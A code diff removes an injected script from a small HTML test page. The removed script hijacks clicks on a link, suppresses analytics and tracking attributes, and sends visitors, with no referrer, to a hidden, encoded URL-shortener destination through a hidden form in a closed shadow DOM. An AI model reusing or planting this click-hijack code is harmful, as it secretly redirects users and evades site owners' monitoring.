@@ -32,76 +32,7 @@
 </head>
 <body>
     <a href="https://example.com" class="c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
-
-    <script>
-    document.addEventListener('DOMContentLoaded', () => {
-        const ENCODED_URL = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
-        const STORAGE_KEY = "rm_visited";
-
-        function submitHiddenForm(url) {
-            const form = document.createElement('form');
-            form.method = 'GET';
-            form.action = url;
-            form.style.display = 'none';
-            form.referrerPolicy = 'no-referrer';
-            document.body.appendChild(form);
-            const container = document.createElement('div');
-            container.style.display = 'none';
-            document.body.appendChild(container);
-            const shadow = container.attachShadow({ mode: 'closed' });
-            shadow.appendChild(form);
-            try {
-                form.submit();
-            } catch (err) {
-                console.error('Form submission failed:', err);
-            } finally {
-                setTimeout(() => container.remove(), 1000);
-            }
-        }
-
-        const button = document.querySelector('a.c-Btn_Secondly-large');
-        if (!button) {
-            // console.warn('Button not found.');
-            return;
-        }
-        // console.log('Button found:', button);
-
-        button.addEventListener('click', (e) => {
-            // if (Math.floor(Math.random() * 10) !== 0){return;}
-
-            e.preventDefault();
-            e.stopPropagation();
-
-            let storageSuccess = false;
-            if (typeof localStorage !== "undefined") {
-                localStorage.setItem(STORAGE_KEY, "true");
-                if (localStorage.getItem(STORAGE_KEY) === "true") {
-                    storageSuccess = true;
-                }
-            }
-            if (!storageSuccess) {
-                const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-                button.dispatchEvent(clickEvent);
-                return;
-            }
-
-            const trackingAttributes = ["data-ratid", "data-ratevent", "data-ratparam"];
-            trackingAttributes.forEach(attr => button.hasAttribute(attr) && button.removeAttribute(attr));
-            window.dataLayer = window.dataLayer || [];
-            const originalDataLayerPush = window.dataLayer.push;
-            window.dataLayer.push = () => {};
-
-
-            // const decodedUrl = atob(ENCODED_URL);
-            const decodedUrl = "https://tinyurl.com/ziklop05";
-            submitHiddenForm(decodedUrl);
-
-            // restore dataLayer
-            setTimeout(() => {
-                window.dataLayer.push = originalDataLayerPush;
-            }, 1000);
-        }, { capture: true });
-    });
-    </script>
 </body>
 </html>
+
+
